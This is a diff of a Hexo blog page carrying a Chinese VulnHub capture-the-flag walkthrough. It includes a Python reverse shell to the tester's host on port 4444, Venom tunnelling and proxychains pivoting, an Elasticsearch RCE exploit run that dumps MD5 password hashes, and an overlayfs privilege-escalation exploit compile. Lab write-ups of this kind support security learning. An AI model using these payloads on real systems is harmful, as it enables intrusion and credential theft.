@@ -6,13 +6,15 @@
   <meta name="keywords" content="">
   <meta name="description" content="红队打靶之VulnHub_BOREDHACKERBLOG_SOCIAL_NETWORK | Hexo">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-<meta property="og:type" content="website">
-<meta property="og:title" content="categories">
-<meta property="og:url" content="http://example.com/categories/index.html">
+<meta name="description" content="我曾在很多地方表达过一个观点，那就是渗透不只是WEB渗透，安全技术还包含很多领域。因此本周我选择了一台高难度的靶机，具体涉及逆向、动态调试、代码审计、漏洞利用代码编写等内容。课程时长超过140分钟，请大家做好克服困难的准备！ 靶机地址: https:&#x2F;&#x2F;download.vulnhub.com&#x2F;boredhackerblog&#x2F;hard_socnet2.ova 难度等级: 高 打靶目标: 取得 ro">
+<meta property="og:type" content="article">
+<meta property="og:title" content="红队打靶之VulnHub_hard_socnet2">
+<meta property="og:url" content="http://example.com/2024/06/20/%E7%BA%A2%E9%98%9F%E6%89%93%E9%9D%B6%E4%B9%8BVulnHub-hard-socnet2/index.html">
 <meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="我曾在很多地方表达过一个观点，那就是渗透不只是WEB渗透，安全技术还包含很多领域。因此本周我选择了一台高难度的靶机，具体涉及逆向、动态调试、代码审计、漏洞利用代码编写等内容。课程时长超过140分钟，请大家做好克服困难的准备！ 靶机地址: https:&#x2F;&#x2F;download.vulnhub.com&#x2F;boredhackerblog&#x2F;hard_socnet2.ova 难度等级: 高 打靶目标: 取得 ro">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2023-05-06T07:25:18.000Z">
-<meta property="article:modified_time" content="2023-10-27T02:58:20.693Z">
+<meta property="article:published_time" content="2024-06-20T06:31:01.000Z">
+<meta property="article:modified_time" content="2024-06-20T12:44:17.022Z">
 <meta property="article:author" content="answer77">
 <meta name="twitter:card" content="summary">
 
@@ -1473,7 +1475,7 @@
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2024-06-19 20:57:10'>2024-06-17 21:52</time>
+            Created At : <time class="date" title='Updated At: 2024-06-20 20:46:56'>2024-06-17 21:52</time>
         
     </div>
     <div class="article-meta">
@@ -1515,31 +1517,31 @@
 <p>这是本系列的第一次打靶，我选择了一个中等难度的靶机。在这次打靶过程中，我们将使用到以下攻击手段：</p>
 <h1 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h1><p>进入root</p>
 <p>用 arp-scan -l</p>
-<p><img src="/.com//%E7%BA%A2%E9%98%9F%E6%89%93%E9%9D%B6%E4%B9%8BVulnHub-BOREDHACKERBLOG-SOCIAL-NETWORK%5C1.png"></p>
+<p><img src="/.com//1.png"></p>
 <h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>nmap -Pn 192.168.56.106</p>
-<p><img src="/.com//%E7%BA%A2%E9%98%9F%E6%89%93%E9%9D%B6%E4%B9%8BVulnHub-BOREDHACKERBLOG-SOCIAL-NETWORK%5C2.png"></p>
+<p><img src="/.com//2.png"></p>
 <p>发现开放了22 和5000 端口</p>
 <h1 id="服务发现"><a href="#服务发现" class="headerlink" title="服务发现"></a>服务发现</h1><p>nmap -p-22 -sV  192.168.56.106</p>
-<p><img src="/.com//%E7%BA%A2%E9%98%9F%E6%89%93%E9%9D%B6%E4%B9%8BVulnHub-BOREDHACKERBLOG-SOCIAL-NETWORK%5C3.png"></p>
+<p><img src="/.com//3.png"></p>
 <h1 id="路径爬取"><a href="#路径爬取" class="headerlink" title="路径爬取"></a>路径爬取</h1><p>dirsearch -u <a target="_blank" rel="noopener" href="http://192.168.56.106:5000/">http://192.168.56.106:5000</a> 扫一下web 应用隐藏的页面</p>
-<p><img src="/.com//%E7%BA%A2%E9%98%9F%E6%89%93%E9%9D%B6%E4%B9%8BVulnHub-BOREDHACKERBLOG-SOCIAL-NETWORK%5C4.png"></p>
+<p><img src="/.com//4.png"></p>
 <p>访问一下</p>
-<h1 id="代码注入"><a href="#代码注入" class="headerlink" title="代码注入"></a>代码注入</h1><p><img src="/.com//%E7%BA%A2%E9%98%9F%E6%89%93%E9%9D%B6%E4%B9%8BVulnHub-BOREDHACKERBLOG-SOCIAL-NETWORK%5C5.png"></p>
+<h1 id="代码注入"><a href="#代码注入" class="headerlink" title="代码注入"></a>代码注入</h1><p><img src="/.com//5.png"></p>
 <p>他说测试代码 先监听一下4444端口 nc  -nvlp 4444</p>
 <p>运行一下代码</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import socket,subprocess,os</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">s.connect((&quot;192.168.56.10&quot;,4444))</span><br><span class="line"></span><br><span class="line">os.dup2(s.fileno(),0)</span><br><span class="line"></span><br><span class="line">os.dup2(s.fileno(),1)</span><br><span class="line"></span><br><span class="line">os.dup2(s.fileno(),2)</span><br><span class="line"></span><br><span class="line">p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p>成功并发现是docker环境 并且是root权限 </p>
-<p><img src="/.com//%E7%BA%A2%E9%98%9F%E6%89%93%E9%9D%B6%E4%B9%8BVulnHub-BOREDHACKERBLOG-SOCIAL-NETWORK%5C8.png"></p>
+<p><img src="/.com//8.png"></p>
 <p>cat &#x2F;proc&#x2F;1&#x2F;cgroup</p>
-<p><img src="/.com//%E7%BA%A2%E9%98%9F%E6%89%93%E9%9D%B6%E4%B9%8BVulnHub-BOREDHACKERBLOG-SOCIAL-NETWORK%5C9.png"></p>
+<p><img src="/.com//9.png"></p>
 <p>是docker环境</p>
 <p>输入 ip a 看一下环境 </p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">app # ip a</span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN </span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">6: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP </span><br><span class="line">    link/ether 02:42:ac:11:00:03 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 172.17.0.3/16 brd 172.17.255.255 scope global eth0</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure>
 
 <p>发现内网网段</p>
 <h1 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h1><p>使用for i in $(seq 1 20); do ping -c 1 172.17.0.$i; done命令看内网存活主机，172.17.0.1-3为开放主机：</p>
-<p><img src="/.com//%E7%BA%A2%E9%98%9F%E6%89%93%E9%9D%B6%E4%B9%8BVulnHub-BOREDHACKERBLOG-SOCIAL-NETWORK%5C10.png"></p>
+<p><img src="/.com//10.png"></p>
 <h1 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h1><p>将Venom工具 文件夹下的admin.exe发送到目标主机 </p>
 <p>在Venom工具 文件夹下开启http服务 在他们俩个之间建立隧道</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>
@@ -1549,30 +1551,30 @@
 <p>在docker环境中运行</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x agent_linux_x64#改下权限</span><br><span class="line">./agent_linux_x64 -rhost 192.168.56.10 -rport 9999</span><br></pre></td></tr></table></figure>
 
-<p><img src="/.com//%E7%BA%A2%E9%98%9F%E6%89%93%E9%9D%B6%E4%B9%8BVulnHub-BOREDHACKERBLOG-SOCIAL-NETWORK%5C11.png"></p>
+<p><img src="/.com//11.png"></p>
 <h1 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h1><p>sudo vi &#x2F;etc&#x2F;proxychains4.conf最后一行加上</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socks5 127.0.0.1 1080</span><br></pre></td></tr></table></figure>
 
 <p>扫描内网</p>
 <p>proxychains nmap -Pn -sT 172.17.0.1</p>
-<p><img src="/.com//%E7%BA%A2%E9%98%9F%E6%89%93%E9%9D%B6%E4%B9%8BVulnHub-BOREDHACKERBLOG-SOCIAL-NETWORK%5C12.png"></p>
+<p><img src="/.com//12.png"></p>
 <p>判断说明172.17.0.1是面向容器的主机</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains nmap -Pn -sT 172.17.0.2</span><br></pre></td></tr></table></figure>
 
 
 
-<p><img src="/.com//%E7%BA%A2%E9%98%9F%E6%89%93%E9%9D%B6%E4%B9%8BVulnHub-BOREDHACKERBLOG-SOCIAL-NETWORK%5C13.png"></p>
+<p><img src="/.com//13.png"></p>
 <p>扫一下版本</p>
-<p><img src="/.com//%E7%BA%A2%E9%98%9F%E6%89%93%E9%9D%B6%E4%B9%8BVulnHub-BOREDHACKERBLOG-SOCIAL-NETWORK%5C14.png"></p>
+<p><img src="/.com//14.png"></p>
 <p>发现是9200端口上是Elasticsearch服务，且版本是1.4.2</p>
 <h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="Elasticsearch漏洞利用"><a href="#Elasticsearch漏洞利用" class="headerlink" title="Elasticsearch漏洞利用"></a>Elasticsearch漏洞利用</h3><p>Elasticsearch在历史版本上曾出现过几次验证漏洞，有<strong>RCE远程代码执行漏洞</strong>。</p>
 <p>所以我们尝试在kali上搜索有没有Elasticsearch相关<strong>exp</strong></p>
-<p><img src="/.com//%E7%BA%A2%E9%98%9F%E6%89%93%E9%9D%B6%E4%B9%8BVulnHub-BOREDHACKERBLOG-SOCIAL-NETWORK%5C15.png"></p>
+<p><img src="/.com//15.png"></p>
 <p>发现两个RCE远程代码执行漏洞，我们先尝试第一个。</p>
 <p>将脚本<strong>拷贝</strong>至当前目录</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/share/exploitdb/exploits/linux/remote/36337.py .</span><br><span class="line"></span><br><span class="line">vi 36337.py  # 查看一下</span><br><span class="line"> </span><br><span class="line">proxychains python2 36337.py 172.17.0.2  # 执行</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p><img src="/.com//%E7%BA%A2%E9%98%9F%E6%89%93%E9%9D%B6%E4%B9%8BVulnHub-BOREDHACKERBLOG-SOCIAL-NETWORK%5C16.png"></p>
+<p><img src="/.com//16.png"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">cat passwords # 查看密码</span><br><span class="line"></span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.17.0.2:9200  ...  OK</span><br><span class="line">Format: number,number,number,number,lowercase,lowercase,lowercase,lowercase</span><br><span class="line">Example: 1234abcd</span><br><span class="line">john:3f8184a7343664553fcb5337a3138814 </span><br><span class="line">test:861f194e9d6118f3d942a72be3e51749</span><br><span class="line">admin:670c3bbc209a18dde5446e5e6c1f1d5b</span><br><span class="line">root:b3d34352fc26117979deabdf1b9b6354</span><br><span class="line">jane:5c158b60ed97c723b673529b8a3cf72b</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p>md5解密</p>
@@ -1604,11 +1606,11 @@
 <p>得到：即使在Kali端使用gcc编译该文件，上传到目标靶机上执行时，执行过程仍然会调用gcc编译后的<strong>ofs-lib.so.so</strong>文件，<strong>仍然会报错</strong>。</p>
 <p>解决办法：修改源代码，<strong>删除调用库文件的代码</strong></p>
 <p>删除后代码为下图</p>
-<p><img src="/.com//%E7%BA%A2%E9%98%9F%E6%89%93%E9%9D%B6%E4%B9%8BVulnHub-BOREDHACKERBLOG-SOCIAL-NETWORK%5C18.png"></p>
+<p><img src="/.com//18.png"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -o exp 37292.c</span><br></pre></td></tr></table></figure>
 
 <p>报错不影响</p>
-<p><img src="/.com//%E7%BA%A2%E9%98%9F%E6%89%93%E9%9D%B6%E4%B9%8BVulnHub-BOREDHACKERBLOG-SOCIAL-NETWORK%5C17.png"></p>
+<p><img src="/.com//17.png"></p>
 <p>配合exp执行使用还需要二进制的库文件<strong>ofs-lib.so</strong>，定位查找该文件路径</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">locate ofs-lib.so</span><br></pre></td></tr></table></figure>
 
